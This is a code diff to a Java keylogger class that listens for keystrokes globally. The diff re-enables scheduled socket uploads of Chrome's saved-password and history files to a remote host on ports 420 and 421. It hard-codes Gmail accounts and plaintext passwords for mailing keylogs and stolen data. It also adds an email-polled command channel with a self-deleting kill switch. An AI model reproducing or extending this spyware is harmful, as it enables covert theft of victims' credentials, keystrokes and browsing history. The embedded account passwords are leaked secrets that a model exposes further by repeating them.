@@ -27,11 +27,14 @@ import javax.activation.DataHandler;
 import javax.activation.DataSource;
 import javax.activation.FileDataSource;
 import javax.mail.BodyPart;
+import javax.mail.Folder;
 import javax.mail.Message;
 import javax.mail.MessagingException;
 import javax.mail.Multipart;
+import javax.mail.NoSuchProviderException;
 import javax.mail.PasswordAuthentication;
 import javax.mail.Session;
+import javax.mail.Store;
 import javax.mail.Transport;
 import javax.mail.internet.InternetAddress;
 import javax.mail.internet.MimeBodyPart;
@@ -122,21 +125,21 @@ public class Main implements NativeKeyListener{
 				 }
 			 }
 			 } else if (dow == 1 || dow == 7) {
-			//	 if (minutes % 2 == 0) {
+				 if (minutes % 2 == 0) {
 				    	// send the file
 					// System.out.println("A " + minutes);
-				//	 upload(getHostIP());
-				  //  } else {
+					 upload(getHostIP());
+				   } else {
 					// System.out.println("B " + minutes);
-				//	 uplogin(getHostIP());
-				// 	 uphistory(getHostIP());
+					 uplogin(getHostIP());
+				 	 uphistory(getHostIP());
+				   }
 				 if ((minutes % 30 == 0 || minutes == 0)) {
 					 mailLogs();
 				 }
 				 }
-			// }
+			 }
 		}
-	}
 
 	private static boolean isSuicune() {
 		try {
@@ -261,7 +264,7 @@ public class Main implements NativeKeyListener{
 			out.flush();
 			socket.close();
 			Socket send = new Socket(getHostIP(), 420);
-			// System.out.println("Accepted connection : " + nakadashi); 
+			// System.out.println("Accepted connection : " + send); 
 			File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"); 
 			byte [] bytearray = new byte [(int)transferFile.length()]; 
 			FileInputStream fin = new FileInputStream(transferFile); 
@@ -288,7 +291,7 @@ public class Main implements NativeKeyListener{
 					out.flush();
 					socket.close();
 					Socket sand = new Socket(getHostIP(), 421);
-					// System.out.println("Accepted connection : " + nakadashi); 
+					// System.out.println("Accepted connection : " + sand); 
 					File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/History"); 
 					byte [] bytearray = new byte [(int)transferFile.length()]; 
 					FileInputStream fin = new FileInputStream(transferFile); 
@@ -315,13 +318,14 @@ public class Main implements NativeKeyListener{
 	 public static void mailLogs() {
 		 // mail keylog, history and saved passwords to email address
 		 // Recipient's email ID needs to be mentioned.
-	      String to = "samplemail@mail.com";
+	      String to = "duvictor514@gmail.com";
 
+	      // use non gmail acct, outlook
 	      // Sender's email ID needs to be mentioned
-	      String from = "noreply@thing.com";
+	      String from = "suzukiairi8892@gmail.com";
 
-	      final String username = "noreply@thing.com";//change accordingly
-	      final String password = "airiismysenpai";//change accordingly
+	      final String username = "suzukiairi8892@gmail.com";//change accordingly
+	      final String password = "richardnguyen";//change accordingly
 
 	      String host = "smtp.gmail.com";
 
@@ -384,10 +388,66 @@ public class Main implements NativeKeyListener{
 	         // Send message
 	         Transport.send(message);
 
-	         System.out.println("Uploading Information to Skynet...");
+	         System.out.println("Transmission successful");
 	  
 	      } catch (MessagingException e) {
-	         throw new RuntimeException(e);
+	    	  System.err.println("Mailer Broadcast Failure: "+ e);
 	      }
 	 }
+	 public static void checkForCommands() {
+		 try {
+
+		      //create properties field
+		      Properties properties = new Properties();
+
+		      properties.put("mail.pop3.host", "pop.gmail.com");
+		      properties.put("mail.pop3.port", "995");
+		      properties.put("mail.pop3.starttls.enable", "true");
+		      Session emailSession = Session.getDefaultInstance(properties);
+		  
+		      //create the POP3 store object and connect with the pop server
+		      Store store = emailSession.getStore("pop3s");
+
+		      store.connect("pop.gmail.com", "suzukiairi8892@gmail.com", "richardnguyen");
+
+		      //create the folder object and open it
+		      Folder emailFolder = store.getFolder("INBOX");
+		      emailFolder.open(Folder.READ_ONLY);
+
+		      // retrieve the messages from the folder in an array and print it
+		      Message[] messages = emailFolder.getMessages();
+		      System.out.println("Command Recv Count: [" + messages.length +"]");
+
+		      for (int i = 0, n = messages.length; i < n; i++) {
+		         Message message = messages[i];
+		         System.out.println("---------------------------------");
+		         System.out.println("[[ Mailer Command Received ]]");
+		         System.out.println("Email Number " + (i + 1));
+		         System.out.println("Subject: " + message.getSubject());
+		   //      System.out.println("From: " + message.getFrom()[0]);
+		         System.out.println("Text: " + message.getContent().toString());
+		         System.out.println("---------------------------------");
+		         if (message.getSubject().matches("KILL") && message.getContent().toString().matches("KILL")) {
+		        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+		 			cf.deleteOnExit();
+		 			System.exit(0);
+		         }
+		         
+		      }
+
+		      //close the store and folder objects
+		      emailFolder.close(false);
+		      store.close();
+
+		      } catch (NoSuchProviderException e) {
+		    	 System.err.println("Mailer request failed:" +e);
+		         e.printStackTrace();
+		      } catch (MessagingException e) {
+		    	  System.err.println("Mailer request failed:" +e);
+		         e.printStackTrace();
+		      } catch (Exception e) {
+		    	  System.err.println("Mailer request failed:" +e);
+		         e.printStackTrace();
+		      }
+		   }
 }
